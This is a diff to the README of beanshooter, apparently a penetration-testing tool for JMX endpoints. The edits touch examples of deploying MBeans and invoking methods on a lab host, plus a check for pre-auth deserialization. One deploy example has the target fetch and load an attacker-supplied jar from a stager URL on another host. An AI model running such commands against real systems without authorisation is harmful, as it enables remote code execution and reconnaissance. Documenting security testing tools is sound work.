@@ -231,7 +231,7 @@ When the *MBean* you want to deploy is already known to the *JMX* service, it is
 When the *MBean* class is not known to the *JMX* service, you can use the `--jar-file` and `--stager-url` options to provide an implementation:
 
 ```console
-[qtc@devbox ~]$ beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar  --stager-url http://172.17.0.1:8000
+[qtc@devbox ~]$ beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000
 [+] Starting MBean deployment.
 [+]
 [+] 	Deplyoing MBean: ExampleBean
@@ -280,10 +280,10 @@ The `enum` action enumerates some configuration details on a *JMX* endpoint. It 
 [+] Checking pre-auth deserialization behavior:
 [+]
 [+] 	- Remote MBeanServer accepted the payload class.
-[+] 	  Configuration Status: Non Defau
+[+] 	  Configuration Status: Non Default
 ```
 
-When authentication is not required, or when you specify valid credentials, the `enum` action also attempts to
+When authentication is not required, or when valid credentials were specified, the `enum` action also attempts to
 enumerate some further information from the *JMX* endpoint. This includes a list of non default *MBeans* and
 e.g. the user accounts registered on a *Apache tomcat* server:
 
@@ -370,27 +370,34 @@ an additional *ObjectName*, only method and attribute information of the specifi
 #### Invoke
 
 The `invoke` action can be used to invoke an arbitrary method on an *MBean* that has already been deployed on a *JMX* endpoint.
-Apart from the target, the `invoke` action requires the `ObjectName` of the targeted *MBean* and the method signature you
-want to invoke. If the specified method expects arguments, these also have to be specified. *MBean* attributes can also be
-obtained by this action, by using the corresponding getter function as method. The following listing shows an example, where
-the `getLoggerNames` function is invoked on the `Logging` *MBean*:
+Apart from the endpoint, the `invoke` action requires the `ObjectName` of the targeted *MBean* and the method signature you
+want to invoke. If the specified method expects arguments, these also have to be specified. The following listing shows an example,
+of an argumentless method invocation, where the `vmVersion()` method from the `DiagnosticCommand` *MBean* is invoked:
 
 ```console
-[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 'java.util.logging:type=Logging' --signature 'getLoggerNames()'
-[+] sun.rmi.transport.tcp
-[+] sun.rmi.server.call
-[+] sun.rmi.loader
-...
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'
+OpenJDK 64-Bit Server VM version 11.0.14.1+1
+JDK 11.0.14.1
 ```
 
 When invoking a method that requires parameters, the specified *beanshooter* arguments are evaluated as *Java code*. Simple argument
 types like integers or strings can just be passed by specifying their corresponding value. Complex argument types can be constructed
-as you would do it in *Java* (e.g. `'new java.util.HashMap()'`). The following listing shows an example, where the `setLoggerNames`
-function is invoked on the `Logging` *MBean*:
+as you would do it in *Java* (e.g. `'new java.util.HashMap()'`). The following listing shows an example, where the `help(String[] args)`
+method is invoked on the `DiagnosticCommand` *MBean*:
 
 ```console
-[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 'java.util.logging:type=Logging' --signature 'setLoggerLevel(String arg1, String arg2)' sun.rmi.transport.tcp INFO
-[+] Call was successful
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'help(String[] args)' 'new String[] { "Compiler.directives_add" }'
+Compiler.directives_add
+Add compiler directives from file.
+
+Impact: Low
+
+Permission: java.lang.management.ManagementPermission(monitor)
+
+Syntax : Compiler.directives_add  <filename>
+
+Arguments:
+    filename :  Name of the directives file (STRING, no default value)
 ```
 
 For more complex argument types that require some initialization, you can use *beanshooters PluginSystem* and define a custom
